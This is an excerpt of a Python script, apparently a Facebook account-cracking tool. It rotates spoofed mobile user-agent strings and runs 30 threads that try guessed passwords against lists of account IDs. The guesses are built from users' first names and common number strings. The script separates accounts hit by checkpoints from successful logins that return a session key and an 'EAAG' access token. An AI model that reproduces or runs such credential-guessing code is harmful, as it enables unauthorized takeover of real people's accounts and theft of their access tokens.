...
except:ugen = ['Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',' Mozilla/5.0 (Linux; Android 5.1; Nexus 10 Build/LRX21P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.0 Safari/537.36',' Mozilla/5.0 (Linux; Android 8.0.0; VS995) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36',' Mozilla/5.0 (Linux; Android 9; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/100.1.163 like Chrome/100.0.4896.127 Safari/537.36',' Mozilla/5.0 (X11; U; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4688.168 Safari/537.36']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = [' Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-S337TL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/92.0.4515.166 Mobile Safari/537.36',' Mozilla/5.0 (Linux; Android 7.0; LGMP260) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36',' Mozilla/5.0 (Linux; Android 8.0.0; SM-G935V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36',' Mozilla/5.0 (Linux; Android 5.1; Nexus 10 Build/LRX21P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.0 Safari/537.36','Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG       
SM-G532M Build/MMB29T) AppleWebKit/537.36 (KHTML,
like Gecko) SamsungBrowser/7.4                   
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['1122334455','1234554321','112233445566','123456654321','20002000','20012001','١٢٣٤٥٦','zxcvbnm']
			if len(nmf)<8:
				if len(frs)<3:
					pass
				else:
		...
		try:
			...
			if "m.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					cp+=1
				break
			elif "session_key" in resp.text and "EAAG" in resp.text:
